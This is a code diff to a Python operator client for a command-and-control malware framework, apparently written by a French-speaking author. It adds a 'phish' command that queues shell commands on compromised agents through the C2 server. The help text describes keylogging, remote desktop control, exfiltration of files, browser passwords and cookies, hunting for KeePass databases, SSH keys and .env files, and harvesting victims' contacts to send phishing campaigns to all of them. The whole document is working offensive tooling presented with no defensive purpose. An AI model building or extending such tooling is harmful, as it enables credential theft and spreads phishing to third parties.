@@ -16,7 +16,7 @@ from datetime import datetime
 from pathlib import Path
 
 # Configuration
-C2_URL = "http://c2.s0p0wned.local:8443"
+C2_URL = "http://192.168.64.13:8443"
 LOG_DIR = Path("logs")
 LOOT_DIR = Path("loot")
 LOG_FILE = LOG_DIR / f"cli_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
@@ -661,6 +661,45 @@ def cmd_results(agent_id=None, auto_wait=False):
         log(f"ERROR: {e}")
 
 
+def cmd_phish(args):
+    """Phish : recon, contacts, envoi test ou campagne"""
+    if not current_agent:
+        print("[-] No agent selected. Use 'use <agent_id>' first")
+        return
+
+    # Construire la commande ("phish" seul = recon mode sur l'agent)
+    command = f"phish {args}".strip()
+
+    try:
+        payload = {
+            "agent_id": current_agent,
+            "type": "shell",
+            "command": command
+        }
+
+        log(f"Sending phish command to {current_agent}: {command}")
+
+        response = requests.post(
+            f"{C2_URL}/command",
+            json=payload,
+            timeout=5
+        )
+
+        if response.status_code == 200:
+            print(f"[+] Command queued: {command}")
+            log(f"Phish command queued successfully")
+            # Campaign peut prendre plus de temps (envoi multiple)
+            timeout = 30 if "campaign" in args else 15
+            wait_for_results(current_agent, timeout=timeout, poll_interval=2)
+        else:
+            print(f"[-] Server error: {response.status_code}")
+            log(f"ERROR: Server returned {response.status_code}")
+
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        log(f"ERROR: {e}")
+
+
 def cmd_clear():
     """Efface l'écran"""
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -721,6 +760,7 @@ Available Commands:
   rdp <args>          Manage Remote Desktop on selected agent
   keylog <args>       Capture keystrokes on selected agent
   loot <args>         Exfiltrate data and search for files
+  phish [args]        Email recon or test email sender
   screenshot          Capture screen (800x600 BMP → saved in loot/)
   clipboard           Read clipboard content (text, files, or image detection)
   results [agent_id]  Show command results (current or specified agent)
@@ -745,9 +785,6 @@ Examples:
   loot sysinfo              # Collect system information
   loot browser              # Find browser data locations
   loot find *.txt           # Search for text files
-  loot grab C:\\file.pdf    # Exfiltrate file → saved in loot/
-  screenshot                # Capture screen → saved in loot/
-  clipboard                 # Read clipboard (text / files / image)
   results                   # Show results for current agent
   watch                     # Auto-refresh results every 2s
   results WIN_25653CD9      # Show results for specific agent
@@ -772,6 +809,14 @@ Loot Commands (data exfiltration):
   loot find <pattern>       # Search for files (*.txt, password*, etc.)
   loot grab <filepath>      # Exfiltrate a file (base64 encoded)
   loot browser              # Find browser data locations (cookies, passwords)
+  loot sensitive            # Hunt KeePass (.kdbx), SSH keys, .pem, .ovpn, .env...
+
+Phish Commands (email recon + campaign):
+──────────────────────────────────────────────────────────
+  phish                     # Detect email clients (Outlook, Thunderbird, webmail)
+  phish contacts            # Extract emails from Windows Contacts + Thunderbird abook
+  phish campaign <smtp:port> <from@email>  # Send phishing emails to all contacts
+  phish send <smtp:port> <from> <to>       # Send a single test email
 
 Agent Control:
 ──────────────────────────────────────────────────────────
@@ -905,10 +950,6 @@ def main():
                 cmd_keylog(args)
             elif cmd == "loot":
                 cmd_loot(args)
-            elif cmd == "screenshot":
-                cmd_screenshot()
-            elif cmd == "clipboard":
-                cmd_clipboard()
             elif cmd == "results":
                 cmd_results(args if args else None)
             elif cmd == "watch":
